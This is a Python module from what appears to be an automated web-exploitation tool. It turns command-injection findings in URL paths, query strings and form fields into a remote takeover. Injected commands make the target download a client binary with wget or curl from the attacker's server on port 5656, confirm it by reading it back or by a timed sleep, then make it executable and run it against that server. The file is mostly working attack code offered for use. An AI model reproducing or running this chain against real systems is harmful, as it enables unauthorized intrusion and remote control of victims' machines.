import os
import requests

from utils.exploitloop.forms import getUrl

###########################################################################
###########################################################################

UUID = "6295953b-143c-4b20-9d18-7c38a510e07a"

###########################################################################
###########################################################################

def getServer():
  ips = os.popen("ip addr | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'").read()
  ip = ips.split("\n")[0]

  return f"http://{ip}:5656"

###########################################################################
###########################################################################

def startServer():
  os.popen("cd libs/priv-esc; python3 server.py --log=../../tmp/priv-esc.log").read()

###########################################################################
###########################################################################

def closeServer(server):
  try:
    requests.get(f"{server}/close")
  except:
    pass

###########################################################################
###########################################################################

def getBlindPayload(payload, command):
  return payload.replace("/usr/bin/sleep 5", command)

###########################################################################
###########################################################################

def getReflectedPayload(payload, command):
  return payload.replace("/usr/bin/cat /etc/passwd", command)

###########################################################################
###########################################################################

def checkClientBlindPayload(payload):
  return getBlindPayload(
    payload,
    f"if[[ -f /tmp/client.sh ]] && [[ /usr/bin/cat /tmp/client | grep '{UUID}' ]]; then /usr/bin/sleep 5; fi"
  )

###########################################################################
###########################################################################

def checkClientReflectedPayload(payload):
  return getReflectedPayload(payload, "/usr/bin/cat /tmp/client")

###########################################################################
###########################################################################

def getUrlResult(exploit, payload):
  if exploit.kind == "path":
    url = exploit.url.injectPath(exploit.field, payload)
  else:
    url = exploit.url.injectQuery(exploit.field, payload)

  return requests.get(url, headers=exploit.headers, cookies=exploit.cookies)

###########################################################################
###########################################################################

def getFormResult(exploit, payload):
  data = exploit.form.inject(exploit.fieldIndex, payload)
  if exploit.form.method in [ "POST", "PUT", "PATCH", "DELETE" ]:
    return requests.request(exploit.form.method, url=exploit.form.url, headers=exploit.headers, cookies=exploit.cookies, data=data)
  
  url = getUrl(exploit.form.url, data)
  return requests.get(url)

###########################################################################
###########################################################################

def reflectedUploadClientPayloads(server, payload):
  yield getReflectedPayload(payload, f"/usr/bin/wget {server}/get-client -O /tmp/client")
  yield getReflectedPayload(payload, f"/usr/bin/curl {server}/get-client -o /tmp/client")

###########################################################################
###########################################################################

def blindUploadClientPayloads(server, payload):
  yield getBlindPayload(payload, f"/usr/bin/wget {server}/get-client -O /tmp/client")
  yield getBlindPayload(payload, f"/usr/bin/curl {server}/get-client -o /tmp/client")

###########################################################################
###########################################################################

def tryUploadAndRunClient(server, reflectedResults, blindResults):
  for exploit in reflectedResults.urls:
    for payload in reflectedUploadClientPayloads(server, exploit.payload):
      getUrlResult(exploit, payload)
      res = getUrlResult(exploit, checkClientReflectedPayload(exploit.payload))
      if UUID in res.text:
        getUrlResult(exploit, getReflectedPayload(exploit.payload, "/usr/bin/chmod +x /tmp/client"))
        getUrlResult(exploit, getReflectedPayload(exploit.payload, f"/tmp/client {server}"))  
        return True
  
  for exploit in blindResults.urls:
    for payload in blindUploadClientPayloads(server, exploit.payload):
      getUrlResult(exploit, payload)
      res = getUrlResult(exploit, checkClientBlindPayload(exploit.payload))
      if res.elapsed.total_seconds() > 5:
        getUrlResult(exploit, getBlindPayload(exploit.payload, "/usr/bin/chmod +x /tmp/client"))
        getUrlResult(exploit, getBlindPayload(exploit.payload, f"/tmp/client {server}"))  
        return True
  
  for exploit in reflectedResults.forms:
    for payload in reflectedUploadClientPayloads(server, exploit.payload):
      getFormResult(exploit, payload)
      res = getFormResult(exploit, checkClientReflectedPayload(exploit.payload))
      if UUID in res.text:
        getFormResult(exploit, getReflectedPayload(exploit.payload, "/usr/bin/chmod +x /tmp/client"))
        getFormResult(exploit, getReflectedPayload(exploit.payload, f"/tmp/client {server}"))  
        return True
  
  for exploit in blindResults.forms:
    for payload in blindUploadClientPayloads(server, exploit.payload):
      getFormResult(exploit, payload)
      res = getFormResult(exploit, checkClientBlindPayload(exploit.payload))
      if res.elapsed.total_seconds() > 5:
        getFormResult(exploit, getBlindPayload(exploit.payload, "/usr/bin/chmod +x /tmp/client"))
        getFormResult(exploit, getBlindPayload(exploit.payload, f"/tmp/client {server}"))  
        return True
  
  return False
